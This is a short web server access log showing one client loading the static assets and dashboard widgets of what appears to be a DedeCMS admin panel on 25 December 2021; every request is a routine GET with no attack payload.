43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/leftmbg1.gif HTTP/1.1" 200 352 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/idnbg1.gif HTTP/1.1" 200 79 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/css/indexbody.css HTTP/1.1" 200 909 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /include/js/jquery/ui.draggable.js HTTP/1.1" 200 4596 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /include/js/jquery/ui.core.js HTTP/1.1" 200 3018 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /include/js/jquery/ui.sortable.js HTTP/1.1" 200 6007 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/js/jquery.json-2.2.min.js HTTP/1.1" 200 996 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/js/indexbody.js HTTP/1.1" 200 612 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/js/drag.js HTTP/1.1" 200 628 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/loadinglit.gif HTTP/1.1" 200 1553 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/close.gif HTTP/1.1" 200 868 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/sp_bg.gif HTTP/1.1" 200 705 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/ico_spider.gif HTTP/1.1" 200 4074 "http://101.33.239.168/dede/css/indexbody.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/dlgtitle.gif HTTP/1.1" 200 2761 "http://101.33.239.168/dede/css/indexbody.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/index_body.php?dopost=showauth HTTP/1.1" 200 354 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/index_body.php?dopost=showad HTTP/1.1" 200 362 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/allbtbg2.gif HTTP/1.1" 200 210 "http://101.33.239.168/dede/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/file_dir.gif HTTP/1.1" 200 1030 "http://101.33.239.168/dede/index_body.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
